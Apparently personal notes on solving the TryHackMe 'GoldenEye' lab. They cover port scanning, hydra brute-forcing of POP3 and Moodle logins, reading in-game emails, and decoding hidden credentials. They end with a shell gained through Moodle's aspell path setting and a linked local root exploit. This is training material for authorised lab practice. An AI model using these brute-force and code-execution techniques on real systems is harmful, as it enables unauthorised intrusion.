Usernames: boris, natalya, admin, alec, xenia

On site mapping, got this http://10.201.20.3/terminal.js
```
//
//Boris, make sure you update your default password. 
//My sources say MI6 maybe planning to infiltrate. 
//Be on the lookout for any suspicious network traffic....
//
//I encoded you p@ssword below...
//
//&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;
//
//BTW Natalya says she can break your codes
//
```

`boris:InvincibleHack3r`
Has some sort of login on http://10.201.20.3/sev-home

Has this written on /sev-home after login
```
Remember, since **_security by obscurity_** is very effective, we have configured our pop3 service to run on a very high non-default port
```

Scan finished and voila it shows the ports
```
PORT      STATE SERVICE     REASON  VERSION
25/tcp    open  smtp        syn-ack Postfix smtpd
|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN,
|_ssl-date: TLS randomness does not represent time
80/tcp    open  http        syn-ack Apache httpd 2.4.7 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: GoldenEye Primary Admin Server
55006/tcp open  ssl/unknown syn-ack
|_ssl-date: TLS randomness does not represent time
55007/tcp open  pop3        syn-ack Dovecot pop3d
|_pop3-capabilities: UIDL TOP RESP-CODES PIPELINING SASL(PLAIN) STLS USER AUTH-RESP-CODE CAPA
|_ssl-date: TLS randomness does not represent time
```

Got these on the smtpd <== try this too
```
   0  exploit/unix/smtp/opensmtpd_mail_from_rce  2020-01-28       excellent  Yes    OpenSMTPD MAIL FROM Remote Code Execution
   1  exploit/unix/local/opensmtpd_oob_read_lpe  2020-02-24       average    Yes    OpenSMTPD OOB Read Local Privilege Escalation
```

Connected to it via TLS and the password was not reused but I could just telnet 
```
namura@pop-os ~/tryhackme $ openssl s_client -connect 10.201.20.3:55007 -starttls pop3
CONNECTED(00000003)
```

Got nothing interesting on `namura@pop-os ~/tryhackme $ ffuf -u http://10.201.20.3/sev-home/FUZZ -w /opt/combined_directories.txt -t 200 -fs 457`
Tried hydra on the username for some creds on 55007 also hydra on the /sev-home for creds for natalya
Got a password for pop3 `bors:secret1!` and retrieved these

```
USER boris
+OK
PASS secret1!
+OK Logged in.
ls -la
-ERR Unknown command: LS
LIST
+OK 3 messages:
1 544
2 373
3 921
.

-ERR Unknown command:
STAT
+OK 3 1838
uidl
+OK
1 0000000169096e36
2 0000000269096e36
3 0000000369096e36
.
RETR 1
+OK 544 octets
Return-Path: <root@127.0.0.1.goldeneye>
X-Original-To: boris
Delivered-To: boris@ubuntu
Received: from ok (localhost [127.0.0.1])
        by ubuntu (Postfix) with SMTP id D9E47454B1
        for <boris>; Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
Message-Id: <20180425022326.D9E47454B1@ubuntu>
Date: Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
From: root@127.0.0.1.goldeneye

Boris, this is admin. You can electronically communicate to co-workers and students here. I'm not going to scan emails for security risks because I trust you and the other admins here.
.
RETR 2
+OK 373 octets
Return-Path: <natalya@ubuntu>
X-Original-To: boris
Delivered-To: boris@ubuntu
Received: from ok (localhost [127.0.0.1])
        by ubuntu (Postfix) with ESMTP id C3F2B454B1
        for <boris>; Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
Message-Id: <20180425024249.C3F2B454B1@ubuntu>
Date: Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
From: natalya@ubuntu

Boris, I can break your codes!
.
RETR 3
+OK 921 octets
Return-Path: <alec@janus.boss>
X-Original-To: boris
Delivered-To: boris@ubuntu
Received: from janus (localhost [127.0.0.1])
        by ubuntu (Postfix) with ESMTP id 4B9F4454B1
        for <boris>; Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
Message-Id: <20180425025235.4B9F4454B1@ubuntu>
Date: Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
From: alec@janus.boss

Boris,

Your cooperation with our syndicate will pay off big. Attached are the final access codes for GoldenEye. Place them in a hidden file within the root directory of this server then remove from this email. There can only be one set of these acces codes, and we need to secure them for the final execution. If they are retrieved and captured our plan will crash and burn!

Once Xenia gets access to the training site and becomes familiar with the GoldenEye Terminal codes we will push to our final stages....

PS - Keep security tight or we will be compromised.

.
```

Added the severnaya-station.com to the DNS hosts
and tried to login as boris but couldn't maybe natalya but the room said that I could do it via xenia?
maybe I have to try hydra for natalya and xenia too

Got natalya's password after hydra `natalya:bird`
```
USER natalya
+OK
PASS bird

+OK Logged in.
-ERR Unknown command:
LIST
+OK 2 messages:
1 631
2 1048
.
RETR 1
+OK 631 octets
Return-Path: <root@ubuntu>
X-Original-To: natalya
Delivered-To: natalya@ubuntu
Received: from ok (localhost [127.0.0.1])
        by ubuntu (Postfix) with ESMTP id D5EDA454B1
        for <natalya>; Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
Message-Id: <20180425024542.D5EDA454B1@ubuntu>
Date: Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
From: root@ubuntu

Natalya, please you need to stop breaking boris' codes. Also, you are GNO supervisor for training. I will email you once a student is designated to you.

Also, be cautious of possible network breaches. We have intel that GoldenEye is being sought after by a crime syndicate named Janus.
.
RETR 2
+OK 1048 octets
Return-Path: <root@ubuntu>
X-Original-To: natalya
Delivered-To: natalya@ubuntu
Received: from root (localhost [127.0.0.1])
        by ubuntu (Postfix) with SMTP id 17C96454B1
        for <natalya>; Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
Message-Id: <20180425031956.17C96454B1@ubuntu>
Date: Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
From: root@ubuntu

Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it's related to security...even if it's not, just enter it in under the guise of "security"...it'll get the change order escalated without much hassle :)

Ok, user creds are:

username: xenia
password: RCP90rulez!

Boris verified her as a valid contractor so just create the account ok?

And if you didn't have the URL on outr internal Domain: severnaya-station.com/gnocertdir
**Make sure to edit your host file since you usually work remote off-network....

Since you're a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.

```

```
USER xenia
+OK
PASS RCP90rulez!
-ERR [AUTH] Authentication failed.
```

Did some recon, there was not so much interesting about this web server
```
 Apache[2.4.7], Content-Language[en], Cookies[MoodleSession], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.7 (Ubuntu)], IP[10.201.70.138], Moodle, PHP[5.5.9-1ubuntu4.24], RedirectLocation[http://severnaya-station.com/gnocertdir/login/index.php], Title[Redirect], X-Powered-By[PHP/5.5.9-1ubuntu4.24]
http://severnaya-station.com/gnocertdir/login/index.php [200 OK] Apache[2.4.7], Content-Language[en], Cookies[MoodleSession], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.7 (Ubuntu)], IP[10.201.70.138], Moodle, PHP[5.5.9-1ubuntu4.24], PasswordField[password], Script[footer,head,text/css,text/javascript], Title[GoldenEye Operators Training - Moodle: Login to the site], UncommonHeaders[content-script-type,content-style-type], X-Frame-Options[sameorigin], X-Powered-By[PHP/5.5.9-1ubuntu4.24]

```
Maybe I have to hydra again, for mr.doak, got this `doak:goat`

```
+OK GoldenEye POP3 Electronic-Mail System
USER doak
+OK
PASS goat
+OK Logged in.
LIST
+OK 1 messages:
1 606
.
RETR 1
+OK 606 octets
Return-Path: <doak@ubuntu>
X-Original-To: doak
Delivered-To: doak@ubuntu
Received: from doak (localhost [127.0.0.1])
        by ubuntu (Postfix) with SMTP id 97DC24549D
        for <doak>; Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
Message-Id: <20180425034731.97DC24549D@ubuntu>
Date: Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
From: doak@ubuntu

James,
If you're reading this, congrats you've gotten this far. You know how tradecraft works right?

Because I don't. Go to our training site and login to my account....dig until you can exfiltrate further information......

username: dr_doak
password: 4England!

```

There was something on `http://severnaya-station.com/gnocertdir/user/files.php`, a file named secret for james
```
007,

I was able to capture this apps adm1n cr3ds through clear txt.

Text throughout most web apps within the GoldenEye servers are scanned, so I cannot add the cr3dentials here.

Something juicy is located here: /dir007key/for-007.jpg

Also as you may know, the RCP-90 is vastly superior to any other weapon and License to Kill is the only way to play.
s3cret.txt (END)

```

Maybe steg, and yeah there was a comment on the image description, got `admin:xWinter1995x!`
```
namura@pop-os ~/tryhackme $ echo "eFdpbnRlcjE5OTV4IQ==" | base64 -d
xWinter1995x!n
```

what the heck, boris was the admin all along, Spent a lot of time here just mapping the site as admin
I had to look at the plugins huhu. There seems to be CVE-2021-21809 but on msfconsole it didn't work

```
Moodle through 2.5.2 allows remote authenticated administrators to execute arbitrary programs by configuring the aspell pathname and then triggering a spell-check operation within the TinyMCE editor.
```

Got aspell on `- [Home](http://severnaya-station.com/gnocertdir/ "Home")/ ► Site administration/ ► Server/ ► [System paths](http://severnaya-station.com/gnocertdir/admin/settings.php?section=systempaths "System paths")`

Now I had to trigger the tinymce editor, but it DOES NOT TRIGGER what the heck
It has been loading for around 15 minutes and now the whole server is lagging wtf

Boom got the shell after changing the spell engine turns out that was the problem
Got shell as www-data and then did some recon, turns out we can instant root with this 
https://www.exploit-db.com/exploits/37292

easy one nothing crazy i guess

